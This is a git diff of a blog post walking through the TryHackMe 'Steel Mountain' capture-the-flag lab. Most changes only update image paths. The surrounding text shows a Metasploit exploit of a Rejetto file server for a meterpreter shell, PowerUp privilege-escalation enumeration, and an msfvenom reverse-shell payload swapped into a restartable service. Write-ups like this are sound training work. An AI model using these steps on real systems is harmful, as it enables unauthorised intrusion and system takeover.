@@ -2,8 +2,8 @@
 title: "TryHackMe-SteelMountain" 
 layout: post
 date: 2020-04-28 22:44
-image: pictures/Steel_Mountain/steelmountain.jpg
-headerImage: false
+image: /assets/images/pictures/Steel_Mountain/steelmountain.jpg
+headerImage: true
 tag:
 - markdown
 - elements
@@ -39,7 +39,7 @@ Deploy the box and run a nmap scan!
 nmap -sC -sV <boxip> 
 ~~~
 
- ![nmap_scan](pictures/Steel_Mountain/nmap_scan.png)
+ ![nmap_scan](/assets/images/pictures/Steel_Mountain/nmap_scan.png)
 
 We have two http services running, let's take a look at those websites!  Access the web service running on port 80
 ~~~
@@ -47,7 +47,7 @@ http://boxip:80
 ~~~
 
 Right clik the image and click on image info. The name of the image will be our first flag! 
-![alt text](/pictures/Steel_Mountain/Flag1.png)
+![alt text](/assets/images/pictures/Steel_Mountain/Flag1.png)
 
 
 {: .box-success}
@@ -69,7 +69,7 @@ Access the webserver on port 8080
 http://boxip:8080
 ~~~
 
-![alt text](/pictures/Steel_Mountain/port8080.png)
+![alt text](/assets/images/pictures/Steel_Mountain/port8080.png)
 
 If you look at the bottom left hand corner we see the file server version. If we click on the blue link it takes us to "Rejetto.com". Put two and two together and you now have your answer for the next flag! 
 
@@ -96,14 +96,14 @@ There are a lot of different ways to obtain the answer to this question, but I c
  - run
 ~~~
 
- ![meterpreter shell](/pictures/Steel_Mountain/meterpreter1.png)
+ ![meterpreter shell](/assets/images/pictures/Steel_Mountain/meterpreter1.png)
  
  It looks like that exploit worked! We now have a meterpreter shell on the vulnerable machine. Type 'pwd' to find out what directory you are in. 
 
  Navigate to bill's 'Desktop' directory where you will find the user.txt file. Read the file and you will have your flag! 
 
 
-![flag2.4](/pictures/Steel_Mountain/Flag2_3.png)
+![flag2.4](/assets/images/pictures/Steel_Mountain/Flag2_3.png)
 
 
 {: .box-success}
@@ -126,7 +126,7 @@ curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Prives
 This will output a copy of the file to your current directory. Switch back to the terminal that has your meterpreter shell running and upload the file. Once you have uploaded it, you will need to load up powershell and run the commands given. 
 
  
- ![meterpreter upload](/pictures/Steel_Mountain/meterpreterupload.png)
+ ![meterpreter upload](/assets/images/pictures/Steel_Mountain/meterpreterupload.png)
  
  ```
   ps> . . \PowerUp.ps1
@@ -135,7 +135,7 @@ This will output a copy of the file to your current directory. Switch back to th
 
 The enumeration file should start to run and you should get back some information on what service is running on this machine. Locate the services that have 'CanRestart' option set equal to 'True'. This will be your answer for the next flag! 
 
-![flag3.2](/pictures/Steel_Mountain/psscan.png)
+![flag3.2](/assets/images/pictures/Steel_Mountain/psscan.png)
 
 
 {: .box-success}
@@ -154,7 +154,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=4443 -e x86/shikata_ga
 
 Once that is done, switch back to your exploited machine and ctrl-c out of powershell and upload the malicious replicate file. 
 
-![msfvenom](/pictures/Steel_Mountain/msfvenom.png)
+![msfvenom](/assets/images/pictures/Steel_Mountain/msfvenom.png)
 
 After the uploading is complete, drop into a shell by entering 'shell'. Once you have a shell, enter this command to stop the service. 
 
@@ -164,7 +164,7 @@ After the uploading is complete, drop into a shell by entering 'shell'. Once you
 
 Perfect! We have stopped the service, now we need to switch it out with our malicious one. 
 
-![Malware](/pictures/Steel_Mountain/copyASC.png)
+![Malware](/assets/images/pictures/Steel_Mountain/copyASC.png)
 
 We now have to open a new terminal, start a listening session on port 4443 and then start the service. **Create a listening session first!**
 
@@ -180,7 +180,7 @@ Boom! You will see a shell pop up on your listening terminal and you will have r
 
 On your new terminal, navigate to Administrator's Desktop and print out root.txt
 
-![Final Flag](/pictures/Steel_Mountain/Final_flag.png)
+![Final Flag](/assets/images/pictures/Steel_Mountain/Final_flag.png)
 
 
 **Question #4: What is the root flag?**
